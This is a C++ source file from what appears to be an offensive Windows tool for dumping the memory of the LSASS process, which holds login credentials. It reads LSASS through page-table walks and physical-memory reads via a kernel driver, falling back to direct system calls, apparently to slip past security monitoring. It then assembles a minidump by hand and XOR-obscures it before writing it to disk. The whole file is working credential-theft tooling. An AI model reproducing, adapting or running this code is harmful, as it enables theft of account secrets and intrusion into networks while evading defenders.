#include "hybrid.h"
#include "../core/log.h"
#include "../core/syscall.h"
#include "../driver/driver.h"

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <vector>
#include <cstring>
#include <algorithm>

namespace dump {
namespace {

constexpr uint64_t PFN_MASK = 0x0000FFFFFFFFF000ULL;
constexpr uint64_t PRESENT  = 1;
constexpr uint64_t PAGESIZE = 1ULL << 7;

static uint64_t va_to_pa(uint64_t cr3, uint64_t va) noexcept {
    uint64_t pml4_idx = (va >> 39) & 0x1FF;
    uint64_t pdpt_idx = (va >> 30) & 0x1FF;
    uint64_t pd_idx   = (va >> 21) & 0x1FF;
    uint64_t pt_idx   = (va >> 12) & 0x1FF;
    uint64_t offset   = va & 0xFFF;

    uint64_t pml4e = 0;
    if (!nx::pr8(cr3 + pml4_idx * 8, &pml4e)) return 0;
    if (!(pml4e & PRESENT)) return 0;

    uint64_t pdpte = 0;
    if (!nx::pr8((pml4e & PFN_MASK) + pdpt_idx * 8, &pdpte)) return 0;
    if (!(pdpte & PRESENT)) return 0;

    if (pdpte & PAGESIZE)
        return (pdpte & PFN_MASK) + (va & 0x3FFFFFFFULL);

    uint64_t pde = 0;
    if (!nx::pr8((pdpte & PFN_MASK) + pd_idx * 8, &pde)) return 0;
    if (!(pde & PRESENT)) return 0;

    if (pde & PAGESIZE)
        return (pde & PFN_MASK) + (va & 0x1FFFFFULL);

    uint64_t pte = 0;
    if (!nx::pr8((pde & PFN_MASK) + pt_idx * 8, &pte)) return 0;
    if (!(pte & PRESENT)) return 0;

    return (pte & PFN_MASK) + offset;
}

struct ReadStats {
    uint64_t pages_phys    = 0;
    uint64_t pages_syscall = 0;
    uint64_t pages_failed  = 0;
    HANDLE   handle        = nullptr;

};

static bool hybrid_read(uint64_t cr3, HANDLE h, uint64_t va,
                        uint8_t* out, size_t len, ReadStats& st) noexcept {
    size_t cursor = 0;
    while (cursor < len) {
        uint64_t page_va  = (va + cursor) & ~0xFFFULL;
        size_t   page_off = (va + cursor) & 0xFFF;
        size_t   chunk    = std::min(0x1000 - page_off, len - cursor);

        {
            uint64_t pa = va_to_pa(cr3, page_va);
            if (pa && nx::prn(pa + page_off, out + cursor,
                              static_cast<uint32_t>(chunk))) {
                st.pages_phys++;
                cursor += chunk;
                continue;
            }
        }

        size_t got = 0;
        NTSTATUS s = nx::NtReadVirtualMemory_syscall(
            h, va + cursor, out + cursor, chunk, &got);
        if (NT_SUCCESS(s) && got) {
            st.pages_syscall++;
        } else {
            memset(out + cursor, 0, chunk);
            st.pages_failed++;
        }
        cursor += chunk;
    }
    return true;
}

static bool phys_read(uint64_t cr3, uint64_t va, void* buf, size_t len,
                      ReadStats& st) noexcept {
    return hybrid_read(cr3, st.handle, va, static_cast<uint8_t*>(buf), len, st);
}

struct ModInfo {
    uint64_t base;
    uint32_t size;
    wchar_t  name[MAX_PATH];
};

static constexpr uint64_t kPebLdr           = 0x18;
static constexpr uint64_t kLdrMemOrderList  = 0x20;
static constexpr uint64_t kEntryMemLinks    = 0x10;
static constexpr uint64_t kEntryDllBase     = 0x30;
static constexpr uint64_t kEntrySize        = 0x40;
static constexpr uint64_t kEntryFullName    = 0x48;
static constexpr uint64_t kEntryBaseName    = 0x58;
static constexpr uint64_t kUstrLen          = 0x00;
static constexpr uint64_t kUstrBuf          = 0x08;

static std::vector<ModInfo> enumerate_modules(uint64_t cr3, uint64_t peb_va,
                                              ReadStats& st) noexcept {
    std::vector<ModInfo> mods;
    if (!peb_va || peb_va >= 0x00007FFFFFFFFFFFULL) return mods;

    uint64_t ldr = 0;
    if (!phys_read(cr3, peb_va + kPebLdr, &ldr, 8, st) || !ldr) return mods;

    uint64_t list_head = ldr + kLdrMemOrderList;
    uint64_t entry_links = 0;
    if (!phys_read(cr3, list_head, &entry_links, 8, st) || !entry_links) return mods;

    int guard = 0;
    while (entry_links && guard < 512) {
        uint64_t entry = entry_links - kEntryMemLinks;

        ModInfo m{};
        phys_read(cr3, entry + kEntryDllBase, &m.base, 8, st);
        phys_read(cr3, entry + kEntrySize,    &m.size, 4, st);
        if (!m.base || !m.size) break;

        uint16_t name_len = 0;
        uint64_t name_buf = 0;
        phys_read(cr3, entry + kEntryFullName + kUstrLen, &name_len, 2, st);
        phys_read(cr3, entry + kEntryFullName + kUstrBuf, &name_buf, 8, st);
        if (name_buf && name_len && name_len < sizeof(m.name) - 2) {
            phys_read(cr3, name_buf, m.name, name_len, st);
            m.name[name_len / sizeof(wchar_t)] = L'\0';
        } else {
            name_len = 0; name_buf = 0;
            phys_read(cr3, entry + kEntryBaseName + kUstrLen, &name_len, 2, st);
            phys_read(cr3, entry + kEntryBaseName + kUstrBuf, &name_buf, 8, st);
            if (name_buf && name_len && name_len < sizeof(m.name) - 2) {
                phys_read(cr3, name_buf, m.name, name_len, st);
                m.name[name_len / sizeof(wchar_t)] = L'\0';
            } else {
                wcscpy(m.name, L"<unknown>");
            }
        }

        mods.push_back(m);

        uint64_t next = 0;
        if (!phys_read(cr3, entry_links, &next, 8, st)) break;
        if (next == list_head || next == entry_links) break;
        entry_links = next;
        guard++;
    }
    return mods;
}

struct ThrInfo { uint32_t tid; uint64_t teb; };

static std::vector<ThrInfo> enumerate_threads(uint32_t lsass_pid) noexcept {
    std::vector<ThrInfo> threads;

    using NtQIT_t = NTSTATUS(NTAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
    auto nqit = reinterpret_cast<NtQIT_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread"));
#pragma GCC diagnostic pop
    if (!nqit) return threads;

    struct TBI {
        int32_t  exit_status; uint32_t _pad;
        uint64_t teb, client_id[2];
        uint64_t affinity;
        int32_t  priority, base_priority;
    };

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return threads;

    THREADENTRY32 te{ sizeof te };
    for (BOOL ok = Thread32First(snap, &te); ok; ok = Thread32Next(snap, &te)) {
        if (te.th32OwnerProcessID != lsass_pid) continue;
        if (threads.size() >= 16) break;

        HANDLE th = OpenThread(THREAD_QUERY_INFORMATION, FALSE, te.th32ThreadID);
        if (!th) continue;

        TBI tbi{};
        ULONG ret = 0;
        if (NT_SUCCESS(nqit(th, 0, &tbi, sizeof tbi, &ret)) && tbi.teb)
            threads.push_back({te.th32ThreadID, tbi.teb});
        CloseHandle(th);
    }
    CloseHandle(snap);
    return threads;
}

#pragma pack(push, 4)

static constexpr uint32_t kMdmpSig = 0x504D444D;
static constexpr uint32_t kMdmpVer = 0x0000A793;

enum StreamType : uint32_t {
    kSysInfo  = 7,
    kModules  = 4,
    kMemory64 = 9,
    kThreads  = 3,
};

struct LocDesc { uint32_t size, rva; };

struct MdmpHdr {
    uint32_t sig, ver, nstreams, dir_rva, checksum, timestamp;
    uint64_t flags;
};

struct MdmpDir { uint32_t type; LocDesc loc; };

struct MdmpSysInfo {
    uint16_t arch, level, revision;
    uint8_t  nproc, product_type;
    uint32_t major, minor, build, platform, csd_rva;
    uint16_t suite, _pad;
    uint8_t  cpu[24];
};

struct MdmpThread {
    uint32_t id, suspend, priclass, priority;
    uint64_t teb, stack_start;
    uint32_t stack_size, stack_rva, ctx_size, ctx_rva;
};

struct MdmpModule {
    uint64_t base;
    uint32_t size, checksum, timestamp, name_rva;
    uint8_t  verinfo[52];
    LocDesc  cv, misc;
    uint64_t reserved[2];
};

struct Mem64Hdr  { uint64_t count, base_rva; };
struct Mem64Desc { uint64_t start, size;     };

#pragma pack(pop)

struct Buf {
    std::vector<uint8_t> d;

    explicit Buf(size_t reserve = 0) { if (reserve) d.reserve(reserve); }
    uint32_t pos() const { return static_cast<uint32_t>(d.size()); }

    template<class T> uint32_t put(const T& v) {
        uint32_t r = pos();
        const auto* p = reinterpret_cast<const uint8_t*>(&v);
        d.insert(d.end(), p, p + sizeof v);
        return r;
    }
    uint32_t raw(const void* p, size_t n) {
        uint32_t r = pos();
        const auto* b = static_cast<const uint8_t*>(p);
        d.insert(d.end(), b, b + n);
        return r;
    }
    uint32_t wstr(const wchar_t* s) {
        uint32_t r   = pos();
        uint32_t len = static_cast<uint32_t>(wcslen(s) * sizeof(wchar_t));
        put(len);
        raw(s, len + sizeof(wchar_t));
        return r;
    }
    void align4() { while (d.size() & 3) d.push_back(0); }
    void p32(size_t off, uint32_t v) { memcpy(d.data() + off, &v, 4); }
    void p64(size_t off, uint64_t v) { memcpy(d.data() + off, &v, 8); }
};

static LocDesc write_sysinfo(Buf& b) {
    using RtlVer_t = NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW);
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"
    auto rtlver = reinterpret_cast<RtlVer_t>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion"));
#pragma GCC diagnostic pop
    RTL_OSVERSIONINFOW v{}; v.dwOSVersionInfoSize = sizeof v;
    if (rtlver) rtlver(&v);
    SYSTEM_INFO si{}; GetNativeSystemInfo(&si);

    MdmpSysInfo s{};
    s.arch         = 9;
    s.level        = static_cast<uint16_t>(si.wProcessorLevel);
    s.revision     = static_cast<uint16_t>(si.wProcessorRevision);
    s.nproc        = static_cast<uint8_t>(si.dwNumberOfProcessors);
    s.product_type = 1;
    s.major        = v.dwMajorVersion;
    s.minor        = v.dwMinorVersion;
    s.build        = v.dwBuildNumber;
    s.platform     = 2;

    uint32_t rva = b.put(s);
    uint32_t csd = b.wstr(L"");
    b.p32(rva + offsetof(MdmpSysInfo, csd_rva), csd);
    return {b.pos() - rva, rva};
}

static LocDesc write_modulelist(Buf& b, const std::vector<ModInfo>& mods) {
    uint32_t stream_rva    = b.put(static_cast<uint32_t>(mods.size()));
    uint32_t entries_start = b.pos();

    for (size_t i = 0; i < mods.size(); i++) {
        MdmpModule md{};
        md.base = mods[i].base;
        md.size = mods[i].size;
        b.put(md);
    }

    for (size_t i = 0; i < mods.size(); i++) {
        b.align4();
        uint32_t nrva = b.wstr(mods[i].name);
        size_t patch  = entries_start + i * sizeof(MdmpModule)
                      + offsetof(MdmpModule, name_rva);
        b.p32(patch, nrva);
    }

    return {b.pos() - stream_rva, stream_rva};
}

static LocDesc write_threadlist(Buf& b, const std::vector<ThrInfo>& threads) {
    uint32_t rva = b.put(static_cast<uint32_t>(threads.size()));
    for (auto& t : threads) {
        MdmpThread mt{};
        mt.id       = t.tid;
        mt.teb      = t.teb;
        mt.priclass = NORMAL_PRIORITY_CLASS;
        mt.priority = THREAD_PRIORITY_NORMAL;
        b.put(mt);
    }
    return {b.pos() - rva, rva};
}

struct Region {
    uint64_t base;
    uint64_t size;
    std::vector<uint8_t> data;
};

static bool region_readable(uint32_t protect) noexcept {
    if (protect & (PAGE_NOACCESS | PAGE_GUARD)) return false;
    switch (protect & 0xFF) {
    case PAGE_READONLY:
    case PAGE_READWRITE:
    case PAGE_WRITECOPY:
    case PAGE_EXECUTE_READ:
    case PAGE_EXECUTE_READWRITE:
    case PAGE_EXECUTE_WRITECOPY:
        return true;
    default:
        return false;
    }
}

static std::vector<Region> read_regions(HANDLE h, uint64_t cr3,
                                        ReadStats& st) noexcept {
    std::vector<Region> regions;

    uint64_t address = 0;
    while (true) {
        nx::MBI mbi{};
        size_t ret = 0;
        NTSTATUS s = nx::NtQueryVirtualMemory_syscall(
            h, address, 0 , &mbi, sizeof mbi, &ret);
        if (!NT_SUCCESS(s) || !ret) break;

        if (mbi.state == MEM_COMMIT && region_readable(mbi.protect)) {
            size_t rsize = static_cast<size_t>(mbi.region_size);
            std::vector<uint8_t> data(rsize);
            hybrid_read(cr3, h, mbi.base_address, data.data(), rsize, st);

            if (std::any_of(data.begin(), data.end(), [](uint8_t b) { return b; }))
                regions.push_back({mbi.base_address, mbi.region_size, std::move(data)});
        }

        address = mbi.base_address + mbi.region_size;
        if (!address) break;
    }

    return regions;
}

}

bool dump_lsass(HANDLE lsass_h, uint32_t lsass_pid,
                uint64_t cr3, uint64_t peb_va, DumpBuffer& out) noexcept {
    ReadStats st{};
    st.handle = lsass_h;

    auto modules = enumerate_modules(cr3, peb_va, st);
    if (modules.empty())
        log_inf("hybrid: module enumeration empty (non-fatal)");
    else
        log_ok("hybrid: {} modules via PEB physical walk", modules.size());

    auto threads = enumerate_threads(lsass_pid);
    if (!threads.empty())
        log_inf("hybrid: {} thread TEBs", threads.size());

    log_inf("hybrid: enumerating regions via direct syscall...");
    auto regions = read_regions(lsass_h, cr3, st);
    if (regions.empty()) {
        log_err("hybrid: no readable regions");
        return false;
    }

    if (threads.empty() && peb_va) {
        bool found = false;
        for (auto& r : regions) {
            for (size_t i = 0; i + 8 <= r.data.size(); i += 8) {
                uint64_t v = 0;
                memcpy(&v, r.data.data() + i, 8);
                if (v == peb_va) {
                    threads.push_back({1, (r.base + i) - 0x60});
                    log_inf("hybrid: synthetic TEB entry (PEB ptr @ 0x{:X})",
                            r.base + i);
                    found = true;
                    break;
                }
            }
            if (found) break;
        }
        if (!found)
            log_inf("hybrid: no PEB pointer in dump - minidump PEB parse will fail");
    }

    uint64_t total_pages = st.pages_phys + st.pages_syscall + st.pages_failed;
    uint64_t total_bytes = 0;
    for (auto& r : regions) total_bytes += r.size;
    log_ok("hybrid: {} regions, {:.1f} MB - {} phys pages ({:.0f}%), "
           "{} syscall pages, {} failed",
           regions.size(), static_cast<double>(total_bytes) / (1024 * 1024),
           st.pages_phys,
           total_pages ? 100.0 * st.pages_phys / total_pages : 0.0,
           st.pages_syscall, st.pages_failed);

    Buf b(128u * 1024 * 1024);

    constexpr int kNStreams = 4;
    uint32_t hdr_off = b.put(MdmpHdr{});
    uint32_t dir_off = b.pos();
    for (int i = 0; i < kNStreams; i++) b.put(MdmpDir{});
    b.align4();

    LocDesc sys_loc = write_sysinfo(b);
    b.align4();
    LocDesc thr_loc = write_threadlist(b, threads);
    b.align4();
    LocDesc mod_loc = write_modulelist(b, modules);
    b.align4();

    uint32_t m64_start = b.pos();
    b.put(Mem64Hdr{static_cast<uint64_t>(regions.size()), 0});
    for (auto& r : regions) b.put(Mem64Desc{r.base, r.size});
    LocDesc mem64_loc{b.pos() - m64_start, m64_start};
    b.align4();

    uint64_t mem_data_rva = b.pos();
    b.p64(m64_start + offsetof(Mem64Hdr, base_rva), mem_data_rva);

    for (auto& r : regions) b.raw(r.data.data(), r.data.size());

    auto patch_dir = [&](int idx, uint32_t type, LocDesc loc) {
        size_t off = dir_off + static_cast<size_t>(idx) * sizeof(MdmpDir);
        b.p32(off,     type);
        b.p32(off + 4, loc.size);
        b.p32(off + 8, loc.rva);
    };
    patch_dir(0, kSysInfo,  sys_loc);
    patch_dir(1, kThreads,  thr_loc);
    patch_dir(2, kModules,  mod_loc);
    patch_dir(3, kMemory64, mem64_loc);

    MdmpHdr hdr{};
    hdr.sig      = kMdmpSig;
    hdr.ver      = kMdmpVer;
    hdr.nstreams = kNStreams;
    hdr.dir_rva  = dir_off;
    memcpy(b.d.data() + hdr_off, &hdr, sizeof hdr);

    size_t total = b.d.size();
    auto*  base  = static_cast<uint8_t*>(
        VirtualAlloc(nullptr, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!base) {
        log_err("hybrid: VirtualAlloc {:.1f} MB failed",
                static_cast<double>(total) / (1024 * 1024));
        return false;
    }
    memcpy(base, b.d.data(), total);
    out.data     = base;
    out.size     = total;
    out.capacity = total;
    return true;
}

void DumpBuffer::free() noexcept {
    if (data) VirtualFree(data, 0, MEM_RELEASE);
    data = nullptr;
    size = capacity = 0;
}

void xor_encrypt(DumpBuffer& buf, uint8_t key) noexcept {
    for (size_t i = 0; i < buf.size; i++) buf.data[i] ^= key;
}

bool write_file(const DumpBuffer& buf, const char* path) noexcept {
    HANDLE f = CreateFileA(path, GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    bool ok = WriteFile(f, buf.data, static_cast<DWORD>(buf.size), &wr, nullptr)
              && wr == buf.size;
    CloseHandle(f);
    if (ok)
        log_inf("write_file: {} bytes on disk", wr);
    return ok;
}

}
